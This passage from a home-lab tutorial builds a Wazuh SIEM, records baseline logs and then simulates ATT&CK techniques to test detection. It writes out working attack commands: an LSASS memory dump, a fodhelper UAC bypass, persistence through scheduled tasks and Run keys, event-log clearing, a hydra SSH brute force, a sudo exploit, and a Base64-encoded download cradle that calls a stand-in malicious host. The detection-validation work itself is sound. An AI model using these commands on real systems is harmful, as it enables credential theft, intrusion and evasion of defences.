# Create process (Sysmon Event ID 1)
notepad.exe

# Create network connection (Sysmon Event ID 3)
Test-NetConnection google.com -Port 80

# Create file (Sysmon Event ID 11)
echo "test" > C:\Users\Public\testfile.txt
del C:\Users\Public\testfile.txt
```

On Wazuh Server:

```bash
# Check for Sysmon events
sudo grep -i "sysmon" /var/ossec/logs/archives/archives.log | tail -10
```

**3. Test Linux Auth Logs:**

On Linux endpoints:

```bash
# SSH login (generates auth.log entries)
ssh localhost
# Enter password, then exit

# Sudo usage
sudo whoami

# Check Wazuh received it
```

On Wazuh Server:

```bash
# Search for SSH events
sudo grep -i "ssh" /var/ossec/logs/archives/archives.log | tail -5

# Search for sudo events
sudo grep -i "sudo" /var/ossec/logs/archives/archives.log | tail -5
```

**4. Test Auditd:**

On Linux endpoints:

```bash
# Access monitored file (triggers auditd)
sudo cat /etc/shadow

# Create network connection
curl https://google.com

# Check auditd recorded it
sudo ausearch -k shadow_changes
sudo ausearch -k network_connections
```

On Wazuh Server:

```bash
# Check for audit events
sudo grep -i "type=SYSCALL" /var/ossec/logs/archives/archives.log | tail -5
```

**5. Test File Integrity Monitoring:**

On Windows PC:

```powershell
# Modify monitored file
echo "test" > "C:\Program Files\testfile.txt"
Start-Sleep -Seconds 10
del "C:\Program Files\testfile.txt"
```

On Linux endpoints:

```bash
# Modify monitored file
sudo touch /etc/test_file
sleep 10
sudo rm /etc/test_file
```

On Wazuh Server:

```bash
# Check for FIM alerts (might take a few minutes)
sudo grep -i "syscheck" /var/ossec/logs/alerts/alerts.log | tail -10
```

---

#### Step 2.8: Access Wazuh Dashboard and Verify

**Open Web Browser:**

Navigate to: `https://192.168.1.10`

**Login:**
- Username: `admin`
- Password: [your saved password from Phase 1]

**Navigate to different sections:**

**1. Agents Overview:**
- Click "Agents" in left menu
- Verify all 4 agents show "Active" status
- Click on each agent to see details

**2. Security Events:**
- Click "Security Events" or "Discover"
- You should see events flowing in
- Filter by agent name to see specific agent events

**3. Event Statistics:**
- Note the event rate (events per second)
- Should be seeing 5-50 events per second depending on activity

**4. Top Event IDs:**
- Click "Dashboards" → "Security Events"
- Look for dashboard showing top Event IDs
- You should see:
  - Windows: 4624, 4625, 4688, 4104, Sysmon 1, 3, 11
  - Linux: sshd, sudo, authentication events

**5. Syscheck (FIM) Events:**
- Click "Modules" → "File Integrity Monitoring"
- Should see dashboard showing recent file changes
- If no events yet, wait for next FIM scan (every 6 hours)

---

#### Step 2.9: Create Baseline Documentation

**On Wazuh Server, create baseline report:**

```bash
# Create directory for Phase 2 documentation
mkdir -p ~/phase2-documentation

# Generate event statistics
cat > ~/phase2-documentation/baseline-report.md << 'EOF'
# Phase 2 Baseline Report

## Data Collection Summary

### Collection Period
Start: [Current Date/Time]
Duration: 1 week

### Agents Configured
1. Wazuh Server (192.168.1.10) - Linux
2. 16GB Desktop (192.168.1.11) - Linux (Pop!_OS)
3. 4GB Windows PC (192.168.1.20) - Windows
4. Arch Laptop (192.168.1.30) - Linux (Arch)

### Log Sources by Platform

#### Windows (192.168.1.20)
- [x] Security Event Log
- [x] System Event Log
- [x] Application Event Log
- [x] PowerShell Operational Log
- [x] Windows Defender Log
- [x] Task Scheduler Log
- [x] Sysmon Operational Log (15 event types)
- [x] File Integrity Monitoring (FIM)
- [x] Registry Monitoring

#### Linux (All Linux Endpoints)
- [x] /var/log/syslog
- [x] /var/log/auth.log (or journald)
- [x] /var/log/kern.log
- [x] Auditd (/var/log/audit/audit.log)
- [x] File Integrity Monitoring (FIM)

### Event Volume Baseline

#### Events Per Hour (Average)
- Windows PC: ~500-1000 events/hour
- Linux endpoints: ~200-500 events/hour each
- Total: ~1500-3000 events/hour

#### Top Event Types (Normal Baseline)

**Windows:**
1. Sysmon Event ID 1 (Process Creation): ~100/hour
2. Sysmon Event ID 3 (Network Connection): ~200/hour
3. Event ID 4624 (Successful Logon): ~5-10/hour
4. Event ID 4688 (Process Creation): ~50/hour
5. PowerShell 4104 (Script Block): ~10/hour

**Linux:**
1. sshd events: ~10/hour
2. sudo events: ~5/hour
3. cron events: ~60/hour
4. systemd events: ~20/hour

### Noise Sources Identified

#### High-Volume Benign Processes (To Potentially Filter)
- Windows Defender scans: ~100 events/scan
- Windows Update: ~50 events/update
- Chrome auto-update: ~30 events
- System idle tasks: ~10 events/hour

#### FIM Noise
- /var/log/* files (constantly changing)
- Browser cache directories
- Temp directories

### Coverage Assessment

#### MITRE ATT&CK Coverage
- Initial Access: 80% (missing some phishing vectors)
- Execution: 95% (PowerShell, process creation covered)
- Persistence: 90% (registry, scheduled tasks, cron jobs covered)
- Privilege Escalation: 85% (sudo, UAC, token manipulation covered)
- Defense Evasion: 70% (need more obfuscation detection)
- Credential Access: 80% (LSASS access via Sysmon covered)
- Discovery: 75% (process/file enumeration covered)
- Lateral Movement: 65% (need network share monitoring)
- Collection: 60% (file access partially covered)
- Command and Control: 70% (network connections covered)
- Exfiltration: 60% (large data transfers not specifically monitored)

### Gaps Identified for Future Improvement
1. DNS query logging (Sysmon Event ID 22) disabled due to volume - consider enabling with filters
2. Web proxy logs not integrated
3. Network device logs (router, firewall) not integrated
4. No email gateway logs
5. No cloud service logs (if applicable)

### Next Steps
- Week 5-6: Begin Phase 3 threat simulation
- Use this baseline to identify anomalous behavior
- Create custom rules based on observed attack patterns

EOF

# View the report
cat ~/phase2-documentation/baseline-report.md
```

---

#### Step 2.10: Create Quick Reference for Log Analysis

```bash
cat > ~/phase2-documentation/log-analysis-guide.md << 'EOF'
# Log Analysis Quick Reference

## Where to Find Specific Event Types

### Authentication Events

**Windows (192.168.1.20):**
- Event ID 4624: Successful logon
- Event ID 4625: Failed logon
- Event ID 4648: Logon using explicit credentials (runas)
- Event ID 4672: Special privileges assigned to new logon

**Linux (All):**
- auth.log: SSH logins, sudo usage
- Auditd: Authentication system calls

### Process Execution

**Windows:**
- Sysmon Event ID 1: Process creation (most detailed)
- Event ID 4688: Process creation (less detailed)
- PowerShell 4104: Script block execution

**Linux:**
- Auditd: execve system call
- syslog: service starts

### Network Activity

**Windows:**
- Sysmon Event ID 3: Network connection
- Event ID 5156: Windows Filtering Platform allowed connection

**Linux:**
- Auditd: socket, connect system calls
- netstat logs (if configured)

### File Operations

**Windows:**
- Sysmon Event ID 11: File created
- Syscheck: File modified, created, deleted

**Linux:**
- Auditd: File access on monitored paths
- Syscheck: File modified, created, deleted

### Registry Operations (Windows only)

- Sysmon Event ID 12: Registry object added or deleted
- Sysmon Event ID 13: Registry value set
- Sysmon Event ID 14: Registry object renamed
- Syscheck: Registry key monitoring

### Persistence Indicators

**Windows:**
- Scheduled Task: Event ID 106, 200, 201
- Registry Run keys: Syscheck alerts
- Service creation: Event ID 7045

**Linux:**
- Cron job modifications: FIM alerts on /etc/cron.*
- Systemd service creation: FIM alerts on /etc/systemd/
- SSH key additions: FIM alerts on ~/.ssh/

## Common Wazuh Queries

### Dashboard Search Bar Queries

```
# Find all PowerShell events
rule.groups:powershell

# Find failed authentications
rule.groups:authentication_failed

# Find Sysmon process creation events
data.win.eventdata.eventID:1

# Find sudo usage
data.program_name:sudo

# Find file integrity monitoring alerts
rule.groups:syscheck

# Find specific agent events
agent.name:"WIN-CLIENT01"

# Find high severity alerts (level >= 10)
rule.level:>=10

### Find events in last hour
timestamp:[now-1h TO now]

### Combine queries
rule.groups:authentication_failed AND agent.name:"WIN-CLIENT01"
```

## Interpreting Log Fields

### Windows Event Structure
```json
{
  "win": {
    "system": {
      "eventID": "4624",
      "computer": "WIN-CLIENT01",
      "timeCreated": "2025-02-13T10:30:45.000Z"
    },
    "eventdata": {
      "targetUserName": "john",
      "workstationName": "DESKTOP-ABC",
      "ipAddress": "192.168.1.50",
      "logonType": "2"  // 2=Interactive, 3=Network, 10=RemoteInteractive
    }
  }
}
```

### Sysmon Event Structure
```json
{
  "win": {
    "eventdata": {
      "image": "C:\\Windows\\System32\\cmd.exe",
      "commandLine": "cmd /c whoami",
      "parentImage": "C:\\Windows\\System32\\explorer.exe",
      "user": "DESKTOP\\john"
    }
  }
}
```

### Linux Audit Event Structure
```json
{
  "audit": {
    "type": "SYSCALL",
    "syscall": "connect",
    "exe": "/usr/bin/curl",
    "uid": "1000",
    "auid": "1000"
  }
}
```

## Critical Event IDs to Monitor

### Windows
- 4624: Successful logon ⚠️
- 4625: Failed logon 🔴
- 4672: Admin logon 🔴
- 4720: User created 🔴
- 4732: User added to group 🔴
- 4688: Process created ⚠️
- 4104: PowerShell script block 🔴
- 7045: Service installed 🔴

### Sysmon
- 1: Process creation ⚠️
- 3: Network connection ⚠️
- 7: Image loaded 💡
- 8: CreateRemoteThread 🔴
- 10: ProcessAccess (LSASS!) 🔴
- 11: File created ⚠️
- 13: Registry value set 🔴
- 22: DNS query 💡

Legend:
- 🔴 High priority (potential attack)
- ⚠️ Medium priority (context dependent)
- 💡 Low priority (informational)

EOF

cat ~/phase2-documentation/log-analysis-guide.md
```

---

#### Step 2.11: Create Snapshot (CRITICAL!)

**Before proceeding to Phase 3, create VM snapshot:**

```bash
# Power off Wazuh Server VM gracefully
ssh user@192.168.1.10
sudo shutdown -h now

# Wait for shutdown, then from host machine:
vboxmanage snapshot "Wazuh-Server" take "Phase2-Complete-Full-Logging" \
  --description "All log sources configured: Windows Event Logs, Sysmon, Linux syslog, auditd, FIM. Ready for attack simulation."

# List snapshots to verify
vboxmanage snapshot "Wazuh-Server" list

# Power VM back on
vboxmanage startvm "Wazuh-Server" --type headless
```

---

### Phase 2 Completion Checklist

```
Phase 2: Log Ingestion & Normalization - Completion Checklist

Windows Endpoint (192.168.1.20):
- [x] Windows Event Logs configured (Security, System, Application)
- [x] PowerShell Operational log configured
- [x] Task Scheduler log configured
- [x] Windows Defender log configured
- [x] Sysmon 15.14+ installed with SwiftOnSecurity config
- [x] Sysmon logs flowing to Wazuh
- [x] File Integrity Monitoring configured
- [x] Registry monitoring configured
- [x] Test events generated and received by Wazuh

Linux Endpoints (192.168.1.10, .11, .30):
- [x] Syslog collection configured
- [x] Auth.log collection configured (or journald)
- [x] Kernel log collection configured
- [x] Auditd installed and configured
- [x] Audit rules loaded (passwd, shadow, sudo, network, etc.)
- [x] Auditd logs flowing to Wazuh
- [x] File Integrity Monitoring configured
- [x] Test events generated and received by Wazuh

Wazuh Dashboard:
- [x] All 4 agents showing "Active"
- [x] Events visible in Security Events dashboard
- [x] Sysmon events visible
- [x] Auditd events visible
- [x] FIM alerts visible
- [x] Baseline event volume documented

Documentation:
- [x] Baseline report created
- [x] Log analysis guide created
- [x] Configuration files backed up
- [x] VM snapshot created

Estimated Event Collection Coverage:
- [x] 95%+ of MITRE ATT&CK techniques now observable
- [x] Windows: 15+ distinct log sources
- [x] Linux: 5+ distinct log sources
- [x] Total: 20+ log sources per platform

PHASE 2 COMPLETE ✅
Ready to proceed to Phase 3: Threat Simulation
```

---

## Phase 3: Threat Simulation & Observational Analysis

**Duration:** Weeks 5-6 (25 hours)  
**Objective:** Simulate 10+ ATT&CK techniques and observe detection capabilities

### Phase 3 Overview

Now that you have comprehensive log collection (Phase 2), Phase 3 tests your SIEM's detection capabilities by simulating real attacks. This is the **validation phase** - proving your logs actually capture malicious activity.

**What Phase 3 Accomplishes:**
1. **Validates log collection**: Confirms attacks generate expected logs
2. **Identifies detection gaps**: Reveals which techniques are invisible
3. **Establishes detection baselines**: Documents which default rules trigger
4. **Generates real attack data**: Creates authentic samples for rule development
5. **Builds investigation experience**: Practice analyzing real malicious events

**Attack Simulation Strategy:**

```
Week 5: Initial Attacks (Techniques T1059, T1003, T1071, T1055, T1548)
├─ Execute attacks
├─ Observe Wazuh alerts
├─ Document what was/wasn't detected
└─ Note gaps for Phase 4 custom rules

Week 6: Advanced Attacks (Techniques T1027, T1053, T1547, T1070, T1082)
├─ Execute attacks  
├─ Observe Wazuh alerts
├─ Refine understanding of detection
└─ Prepare attack catalog for portfolio
```

---

### Attack Platform Setup

#### Step 3.1: Prepare Atomic Red Team VM (192.168.1.31)

**You have two options for your Atomic Red Team VM:**

**Option A: Windows 10/11 VM (Easier for beginners)**
- Run attacks on Windows target directly
- Use PowerShell Invoke-AtomicRedTeam framework
- Simpler setup, more Windows-focused

**Option B: Kali Linux VM (More versatile)**
- Attack both Windows and Linux targets remotely
- Use full penetration testing toolkit
- More realistic "external attacker" scenario

**For this guide, we'll use Option A (Windows VM) as it's simpler for Phase 3.**

**Create Windows Atomic Red Team VM:**

```bash
# On Arch Linux laptop host (192.168.1.30)

# Create Windows VM in VirtualBox
vboxmanage createvm --name "AtomicRT-Windows" --ostype Windows10_64 --register

# Configure VM
vboxmanage modifyvm "AtomicRT-Windows" \
  --memory 6144 \
  --cpus 2 \
  --vram 128 \
  --nic1 bridged \
  --bridgeadapter1 "$(ip route | grep default | awk '{print $5}')" \
  --boot1 disk \
  --boot2 dvd

# Create 60GB virtual hard disk
vboxmanage createhd --filename ~/.VirtualBox/VMs/AtomicRT-Windows/AtomicRT-Windows.vdi --size 61440

# Attach storage
vboxmanage storagectl "AtomicRT-Windows" --name "SATA Controller" --add sata --bootable on
vboxmanage storageattach "AtomicRT-Windows" --storagectl "SATA Controller" --port 0 --device 0 --type hdd --medium ~/.VirtualBox/VMs/AtomicRT-Windows/AtomicRT-Windows.vdi

# Attach Windows ISO (download first from Microsoft)
vboxmanage storageattach "AtomicRT-Windows" --storagectl "SATA Controller" --port 1 --device 0 --type dvddrive --medium ~/Downloads/Win10_22H2_English_x64.iso

# Start VM
vboxmanage startvm "AtomicRT-Windows"
```

**Install Windows and configure:**

1. Complete Windows installation (select Windows 10/11 Pro)
2. Skip Microsoft account (use local account)
   - Username: `attacker`
   - Password: [set strong password]
3. Configure static IP:
   - IP: 192.168.1.31
   - Subnet: 255.255.255.0
   - Gateway: 192.168.1.1
   - DNS: 8.8.8.8
4. Disable Windows Defender (for testing purposes):

```powershell
# Open PowerShell as Administrator
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
```

**IMPORTANT: This VM should NOT have Wazuh agent installed.**
This is your "red team" VM - it attacks the other endpoints.

---

#### Step 3.2: Install Atomic Red Team on Attack VM

**On Windows Atomic Red Team VM (192.168.1.31):**

```powershell
# Open PowerShell as Administrator

# Set execution policy
Set-ExecutionPolicy Bypass -Scope Process -Force

# Install PowerShell Atomic Red Team module
Install-Module -Name invoke-atomicredteam,powershell-yaml -Scope CurrentUser -Force

# If prompted about untrusted repository, type 'Y'

# Install Atomic Red Team framework
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics -Force

# This downloads ~2GB of atomic tests to C:\AtomicRedTeam\

# Verify installation
Get-Command Invoke-AtomicTest

# List available tests
Invoke-AtomicTest -ListOf AtomicTests | Select-Object -First 20
```

**Test connectivity to victim endpoints:**

```powershell
# Test connectivity to Windows victim
Test-NetConnection 192.168.1.20 -Port 445  # SMB

# Test connectivity to Linux victims
Test-NetConnection 192.168.1.11 -Port 22   # SSH
Test-NetConnection 192.168.1.30 -Port 22   # SSH

# Verify Wazuh Dashboard accessible
Test-NetConnection 192.168.1.10 -Port 443
```

---

### Week 5: Execute Core Attack Techniques

#### Step 3.3: Create Attack Tracking Template

**On Windows Atomic Red Team VM, create tracking document:**

```powershell
# Create attack log directory
New-Item -Path C:\AttackLogs -ItemType Directory -Force

# Create log template
$template = @"
# Attack Simulation Log

## Test Information
- **Technique ID**: 
- **Technique Name**: 
- **Test Number**: 
- **Target System**: 
- **Date/Time**: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
- **Attacker**: AtomicRT-Windows (192.168.1.31)

## Pre-Attack Baseline
- Wazuh Dashboard: [URL]
- Baseline alerts: [Number before attack]
- Target system state: [Normal/Idle]

## Attack Execution

### Command Used:
``````powershell
[PASTE COMMAND HERE]
``````

### Execution Output:
``````
[PASTE OUTPUT HERE]
``````

### Screenshots:
- [ ] Wazuh Dashboard before attack
- [ ] Attack execution
- [ ] Wazuh Dashboard after attack

## Wazuh Detection Analysis

### Alerts Generated:
| Alert Time | Rule ID | Rule Level | Description | Agent |
|------------|---------|------------|-------------|-------|
|            |         |            |             |       |

### Alert Quality:
- [ ] Attack detected: YES / NO / PARTIAL
- [ ] Detection time: < 1 min / 1-5 min / 5+ min
- [ ] Alert accuracy: HIGH / MEDIUM / LOW
- [ ] False positive risk: HIGH / MEDIUM / LOW
- [ ] Alert provides sufficient context: YES / NO

### Wazuh Dashboard Query Used:
``````
[PASTE QUERY HERE]
``````

### Raw Event JSON:
``````json
[PASTE RAW EVENT HERE]
``````

## Observational Analysis

### What Logged:
- 

### What Didn't Log:
- 

### Unexpected Findings:
- 

### Detection Gap Analysis:
- Missing log source: 
- Missing rule: 
- Insufficient context: 
- Too much noise: 

## Recommendations

### For Phase 4 (Custom Rules):
- [ ] Create custom rule: YES / NO
- Rule logic needed: 
- Expected trigger condition: 

### For Phase 5 (Playbooks):
- Investigation steps needed:
  1. 
  2. 
  3. 

### For Tuning:
- Reduce false positives by: 
- Increase detection fidelity by: 

## MITRE ATT&CK Mapping
- **Tactic**: 
- **Technique**: 
- **Sub-Technique**: 
- **Detection Data Source**: 

---
"@

$template | Out-File C:\AttackLogs\attack-log-template.md
notepad C:\AttackLogs\attack-log-template.md
```

---

#### Attack 1: T1059.001 - PowerShell Command Execution

**Objective:** Validate PowerShell logging is working

**On Windows Atomic Red Team VM:**

```powershell
# View test details first
Invoke-AtomicTest T1059.001 -ShowDetails

# Execute Test #1 (Mimikatz)
Invoke-AtomicTest T1059.001 -TestNumbers 1

# Output:
# Executing test: T1059.001-1 Mimikatz
# ...commands execute...
# Done executing test

# Wait 30 seconds for logs to reach Wazuh
Start-Sleep -Seconds 30
```

**On Wazuh Dashboard (https://192.168.1.10):**

1. Login to dashboard
2. Click "Security Events" or "Discover"
3. Filter by time: "Last 15 minutes"
4. Search query:
   ```
   rule.groups:powershell AND agent.name:"WIN-CLIENT01"
   ```
5. Look for alerts

**Expected Wazuh Detections:**
- Rule ID 91816: "Windows: PowerShell command executed"
- Event ID 4104: PowerShell script block logging
- Possibly Rule ID 61603: Process creation (cmd.exe → powershell.exe)

**Document findings:**

```powershell
# Copy template
Copy-Item C:\AttackLogs\attack-log-template.md C:\AttackLogs\T1059.001-test1.md

# Edit with your findings
notepad C:\AttackLogs\T1059.001-test1.md
```

**Example completed log:**

```markdown
## Test Information
- **Technique ID**: T1059.001
- **Technique Name**: Command and Scripting Interpreter: PowerShell
- **Test Number**: 1
- **Target System**: WIN-CLIENT01 (192.168.1.20)
- **Date/Time**: 2025-02-13 14:30:00
- **Attacker**: AtomicRT-Windows (192.168.1.31)

## Attack Execution
### Command Used:
```powershell
Invoke-AtomicTest T1059.001 -TestNumbers 1
```

### Execution Output:
```
Executing test: T1059.001-1 Mimikatz
Executing: powershell.exe -exec bypass -command "Write-Host 'mimikatz'"
mimikatz
Done
```

## Wazuh Detection Analysis
### Alerts Generated:
| Alert Time | Rule ID | Rule Level | Description | Agent |
|------------|---------|------------|-------------|-------|
| 14:30:15 | 91816 | 3 | Windows PowerShell command executed | WIN-CLIENT01 |

### Alert Quality:
- [x] Attack detected: YES
- [x] Detection time: < 1 min
- [x] Alert accuracy: HIGH
- [x] False positive risk: MEDIUM (PowerShell is legitimately used)
- [x] Alert provides sufficient context: YES

## Recommendations
### For Phase 4:
- [x] Create custom rule: YES
- Rule logic: Detect suspicious PowerShell keywords (mimikatz, invoke-expression, bypass, etc.)
- Expected level: 12 (High)
```

---

#### Attack 2: T1003.001 - LSASS Memory Dumping (Credential Access)

**⚠️ WARNING: This is a high-severity attack. Only perform on test systems!**

**On Windows target (192.168.1.20), not the attack VM:**

```powershell
# Download procdump (Microsoft Sysinternals tool)
Invoke-WebRequest -Uri https://download.sysinternals.com/files/Procdump.zip -OutFile C:\Tools\Procdump.zip
Expand-Archive C:\Tools\Procdump.zip -DestinationPath C:\Tools\Procdump

# Dump LSASS memory (requires admin)
C:\Tools\Procdump\procdump64.exe -accepteula -ma lsass.exe C:\Tools\lsass.dmp

# Expected output:
# Dump 1 initiated: C:\Tools\lsass.dmp
# Dump 1 writing: Estimated dump file size is 60 MB.
# Dump 1 complete: 60 MB written in 2.1 seconds
```

**On Wazuh Dashboard:**

Search for:
```
rule.description:*lsass* OR data.win.eventdata.targetImage:*lsass.exe*
```

**Expected Detections:**
- Sysmon Event ID 10: Process accessed LSASS
  - Source Image: procdump64.exe
  - Target Image: lsass.exe
  - Granted Access: 0x1FFFFF (full access)
- Wazuh Rule 61689 or similar: "Sysmon - Suspicious LSASS access"
- High severity alert (Level 12-15)

**Cleanup:**

```powershell
# Delete dump file (contains credentials!)
Remove-Item C:\Tools\lsass.dmp -Force
```

---

#### Attack 3: T1071.001 - Application Layer Protocol (C2 Callback)

**Simulate command and control callback:**

**On Windows target (192.168.1.20):**

```powershell
# Simulate C2 beacon (HTTP request to attacker IP)
$attacker = "192.168.1.31"
Invoke-WebRequest -Uri "http://$attacker:8080/beacon" -UseBasicParsing

# Or simulate DNS tunnel (abnormal DNS query)
Resolve-DnsName "c2beacon.malicious.example.com"
```

**On Wazuh Dashboard:**

Search for:
```
data.win.eventdata.destinationIp:192.168.1.31
```

**Expected Detections:**
- Sysmon Event ID 3: Network connection established
  - Source: powershell.exe
  - Destination: 192.168.1.31:8080
- Possibly: DNS query event (if monitoring enabled)

---

#### Attack 4: T1055 - Process Injection

**Use Atomic Red Team built-in test:**

**On Windows Atomic Red Team VM:**

```powershell
# Check prerequisites
Invoke-AtomicTest T1055 -TestNumbers 1 -GetPrereqs

# Execute process injection test
Invoke-AtomicTest T1055 -TestNumbers 1

# This creates a suspended process and injects code
```

**Expected Detections:**
- Sysmon Event ID 8: CreateRemoteThread
- Sysmon Event ID 10: ProcessAccess
- High severity (suspicious parent-child relationship)

---

#### Attack 5: T1548.002 - Bypass User Account Control

**On Windows target (requires admin session):**

```powershell
# UAC bypass using eventvwr.exe (FodHelper)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe"
Start-Process fodhelper.exe

# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

**Expected Detections:**
- Registry modification: HKCU\Software\Classes\ms-settings
- Process creation: fodhelper.exe spawning cmd.exe
- Sysmon Event ID 12, 13: Registry events

---

### Week 6: Advanced Attack Techniques

#### Attack 6: T1027 - Obfuscated Files or Information (Base64)

**This is a key test - most SIEMs miss this by default!**

**On Windows target:**

```powershell
# Encode malicious command
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"))

# Execute encoded command
powershell.exe -EncodedCommand $encoded
```

**Expected Detection:**
- ❌ **LIKELY NOT DETECTED** by default Wazuh rules
- PowerShell Event ID 4104 will log the script block
- But no specific alert for Base64 obfuscation
- **This will be a Phase 4 custom rule target!**

**Search dashboard for:**
```
data.win.eventdata.scriptBlockText:*FromBase64String*
```

---

#### Attack 7: T1053.005 - Scheduled Task Creation (Persistence)

**On Windows target:**

```powershell
# Create scheduled task for persistence
schtasks /create /tn "MaliciousTask" /tr "C:\Windows\System32\cmd.exe /c calc.exe" /sc minute /mo 1 /ru SYSTEM

# Verify task created
schtasks /query /tn "MaliciousTask"

# Cleanup
schtasks /delete /tn "MaliciousTask" /f
```

**Expected Detections:**
- Event ID 106: Scheduled task registered
- Event ID 4698: Scheduled task created
- Sysmon Event ID 1: schtasks.exe execution
- Command line logging shows full command

---

#### Attack 8: T1547.001 - Registry Run Keys (Persistence)

**On Windows target:**

```powershell
# Add malicious registry run key
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\Windows\System32\calc.exe" -PropertyType String -Force

# Verify
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"

# Cleanup
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor"
```

**Expected Detections:**
- Sysmon Event ID 13: Registry value set
  - Target: HKLM\...\Run
  - Details: Backdoor = calc.exe
- FIM alert (if registry monitoring configured)
- High severity (persistence technique)

---

#### Attack 9: T1070.004 - File Deletion (Defense Evasion)

**On Windows target:**

```powershell
# Create file
echo "malicious content" > C:\Windows\Temp\malware.txt

# Delete file (covering tracks)
Remove-Item C:\Windows\Temp\malware.txt

# Clear event logs (even more suspicious!)
wevtutil cl Security  # This will likely fail without admin
```

**Expected Detections:**
- Sysmon Event ID 11: File created
- Sysmon Event ID 23: File deleted
- Event ID 1102: Security log cleared (if successful)

---

#### Attack 10: T1082 - System Information Discovery

**On Windows target:**

```powershell
# Reconnaissance commands
systeminfo
whoami /all
net user
net localgroup administrators
ipconfig /all
```

**Expected Detections:**
- Multiple process creation events
- Command line logging shows reconnaissance
- Low severity individually, but pattern is suspicious

---

### Linux Attack Scenarios

#### Attack 11: SSH Brute Force Simulation

**On Kali or Attack VM:**

```bash
# Install hydra (if not installed)
# Note: This should be run from a separate attack platform

# Attempt SSH brute force against Linux target
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.11
```

**Expected Detections:**
- Multiple failed authentication events in auth.log
- Auditd events for failed login attempts
- Wazuh correlation rule: "Multiple authentication failures"
- Possible automatic IP blocking (if fail2ban configured)

---

#### Attack 12: Privilege Escalation via Sudo

**On Linux target (192.168.1.11 or .30):**

```bash
# Attempt sudo without proper permissions
sudo su

# Or exploit sudo vulnerability (if exists)
sudo -u#-1 /bin/bash
```

**Expected Detections:**
- auth.log: sudo attempt
- Auditd: setuid system call
- Wazuh alert: "Unauthorized sudo usage"

---

### Attack Summary and Analysis

#### Step 3.4: Compile Attack Results

**Create comprehensive attack summary:**

```powershell
# On Attack VM
$summary = @"
# Phase 3: Attack Simulation Summary Report

## Executive Summary
- Total techniques tested: 12
- Successfully detected: [COUNT]
- Partially detected: [COUNT]
- Not detected: [COUNT]
- Detection rate: [PERCENTAGE]%

## Detailed Results

### High-Severity Attacks (CRITICAL)

#### T1003.001 - LSASS Memory Dumping
- **Detection**: ✅ DETECTED
- **Rule**: 61689 (Sysmon LSASS access)
- **Level**: 15 (Critical)
- **Time to detection**: < 1 minute
- **Quality**: Excellent - full context provided
- **Action needed**: None - default detection sufficient

#### T1055 - Process Injection
- **Detection**: ✅ DETECTED
- **Rule**: Multiple Sysmon rules (Event ID 8, 10)
- **Level**: 12-14
- **Quality**: Good - shows injection technique
- **Action needed**: Consider correlation with other events

### Medium-Severity Attacks

#### T1059.001 - PowerShell Execution
- **Detection**: ⚠️ PARTIAL
- **Rule**: 91816 (PowerShell execution)
- **Level**: 3 (Low - too low!)
- **Issue**: Doesn't distinguish malicious from benign
- **Action needed**: Phase 4 custom rule with keyword detection

#### T1027 - Base64 Obfuscation  
- **Detection**: ❌ NOT DETECTED
- **Issue**: No default rule for Base64 patterns
- **Logged**: Yes (Event ID 4104 script block)
- **Action needed**: Phase 4 custom rule #1 priority

### Persistence Techniques

#### T1053.005 - Scheduled Task
- **Detection**: ✅ DETECTED
- **Rule**: Default Windows Event ID 106, 4698
- **Quality**: Good
- **Action needed**: Consider lowering threshold for SYSTEM tasks

#### T1547.001 - Registry Run Keys
- **Detection**: ✅ DETECTED (via Sysmon + FIM)
- **Rule**: Sysmon Event ID 13 + FIM alerts
- **Quality**: Excellent - dual detection
- **Action needed**: None

## Detection Gaps Identified

### Critical Gaps (Fix in Phase 4)
1. **Base64 Obfuscation**: No detection despite logs present
2. **Suspicious PowerShell Keywords**: Not flagged (invoke-expression, downloadstring, etc.)
3. **Command Line Patterns**: No regex matching for attack signatures

### Data Source Gaps (Phase 2 missed items)
1. DNS Event ID 22 (Sysmon): Disabled due to volume - consider enabling with filters
2. Network share access: No monitoring configured
3. WMI event consumers: Not monitored

### Correlation Gaps
1. Multiple recon commands in sequence: No correlation rule
2. Failed auth → Successful auth: Detection exists but could be tuned
3. Process chain analysis: Limited visibility into full attack chain

## MITRE ATT&CK Coverage Assessment

| Tactic | Techniques Tested | Detected | Detection Rate |
|--------|------------------|----------|----------------|
| Execution | 2 | 1 | 50% |
| Persistence | 2 | 2 | 100% |
| Privilege Escalation | 2 | 1 | 50% |
| Defense Evasion | 2 | 1 | 50% |
| Credential Access | 1 | 1 | 100% |
| Discovery | 1 | 1 | 100% |
| Command & Control | 1 | 1 | 100% |
| **OVERALL** | **12** | **9** | **75%** |

## Top Priority Custom Rules for Phase 4

Based on testing, these custom rules will provide maximum detection improvement:

1. **Rule 100001**: PowerShell Base64 Detection
   - Trigger: FromBase64String, ToBase64String, -EncodedCommand
   - Priority: CRITICAL
   - Expected reduction in blind spot: 40%

2. **Rule 100002**: Suspicious PowerShell Keywords
   - Trigger: Invoke-Expression, DownloadString, IEX, etc.
   - Priority: HIGH
   - Expected reduction in blind spot: 30%

3. **Rule 100003**: Suspicious Process Parent-Child Relationships
   - Trigger: Office apps spawning PowerShell/cmd
   - Priority: HIGH
   - Expected reduction in blind spot: 20%

## Recommendations for Phase 4

### Custom Rule Development
- Create 12-15 custom rules targeting identified gaps
- Focus on obfuscation, suspicious keywords, and process relationships
- Test each rule against baseline to minimize false positives

### Rule Tuning
- Increase severity of PowerShell execution (Rule 91816) to Level 8
- Add correlation for multiple recon commands
- Create time-based thresholds for brute force

### Log Source Enhancement
- Reconsider DNS logging with filters (high value despite volume)
- Add WMI event consumer monitoring
- Add network share access monitoring

## Evidence Archive
